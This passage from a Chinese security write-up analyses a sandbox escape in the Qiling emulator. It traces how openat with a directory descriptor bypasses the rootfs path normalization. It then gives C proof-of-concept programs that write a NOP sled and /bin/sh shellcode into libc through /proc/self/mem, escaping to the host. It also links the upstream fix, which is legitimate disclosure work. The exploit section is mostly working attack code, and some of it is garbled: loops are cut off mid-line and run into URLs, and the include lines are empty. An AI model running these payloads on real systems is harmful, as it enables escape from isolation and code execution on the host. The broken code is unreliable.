                self.ql.log.info(f"mapping {path}")
                return self._open_mapping_ql_file(path, openflags, openmode)
            else:
                if dir_fd:
                    return ql_file.open(path, openflags, openmode, dir_fd=dir_fd)
                real_path = self.ql.os.path.transform_to_real_path(path)
                return ql_file.open(real_path, openflags, openmode)
在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。
        def transform_to_real_path(self, path: str) -> str:
            real_path = self.convert_path(self.ql.rootfs, self.cwd, path)
    .......
            return str(real_path.absolute())
但是真正的隔离其实是convert_path实现的：
        @staticmethod
        def convert_for_native_os(rootfs: Union[str, Path], cwd: str, path: str) -> Path:
            _rootfs = Path(rootfs)
            _cwd = PurePosixPath(cwd[1:])
            _path = Path(path)
            if _path.is_absolute():
                return _rootfs / QlPathManager.normalize(_path)
            else:
                return _rootfs / QlPathManager.normalize(_cwd / _path.as_posix())
        def convert_path(self, rootfs: Union[str, Path], cwd: str, path: str) -> Path:
            emulated_os = self.ql.ostype
            hosting_os = self.ql.platform_os
            # emulated os and hosting platform are of the same type
            if  (emulated_os == hosting_os) or (emulated_os in QL_OS_POSIX and hosting_os in QL_OS_POSIX):
                return QlPathManager.convert_for_native_os(rootfs, cwd, path)
            elif emulated_os in QL_OS_POSIX and hosting_os == QL_OS.WINDOWS:
                return QlPathManager.convert_posix_to_win32(rootfs, cwd, path)
            elif emulated_os == QL_OS.WINDOWS and hosting_os in QL_OS_POSIX:
                return QlPathManager.convert_win32_to_posix(rootfs, cwd, path)
            else:
                return QlPathManager.convert_for_native_os(rootfs, cwd, path)
这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越：
        def normalize(path: Union[Path, PurePath]) -> Union[Path, PurePath]:
            # expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath
            assert isinstance(path, (Path, PurePath)), f'did not expect {type(path).__name__!r} here'
            normalized_path = type(path)()
            # remove anchor (necessary for Windows UNC paths) and convert to relative path
            if path.is_absolute():
                path = path.relative_to(path.anchor)
            for p in path.parts:
                if p == '.':
                    continue
                if p == '..':
                    normalized_path = normalized_path.parent
                    continue
                normalized_path /= p
            return normalized_path
符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。
### 漏洞利用
在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。
    #include
    #include
    #include
    unsigned char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    unsigned char code[] = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x1\x1\x81\x34\x24\x1\x1\x1\x1\x31\xf6\x56\x6a\x8\x5e\x48\x1\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\xf\x5";
    int main() {
        char buf[4096] = "0";
        int fd = open("/proc/self/maps", O_RDONLY);
        int fd_mem = open("/proc/self/mem", O_RDWR);
        FILE *fp_map = fdopen(fd, "r");
        unsigned long addr = 0;
        while(1) {
            fgets(buf, sizeof buf, fp_map);
            if (strstr(buf, "r-xp")!=NULL && strstr(buf, "libc-")) {
                sscanf(buf, "%lx-", &addr);
                break;
            }
        }
        lseek(fd_mem, addr, SEEK_SET);
        for (int i=0; i https://www.anquanke.com/post/id/257350#h2-0
至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。
    int main() {
        long start_addr;
        // Open mappings
        int map = openat(1, "/proc/self/maps", O_RDONLY);
        // Open Python process memory
        int mem = openat(1, "/proc/self/mem", O_RDWR);
        FILE *fp_map = fdopen(map, "r");
        // Find the first executable mapping for Libc
        char line[4096];
        while (fgets(line, sizeof line, fp_map)) {
            size_t len = strlen(line);
            if (strstr(line, "r-xp") != NULL && strstr(line, "libc-")) {
                // Retrive start address of mapping
                sscanf(line, "%lx-", &start_addr);
                printf("%lx\n", start_addr);
                break;
            }
        }
        // Seek to the address of the executable mapping for Libc
        lseek(mem, start_addr, SEEK_SET);
        for(int i=0; i 
> https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe
* * *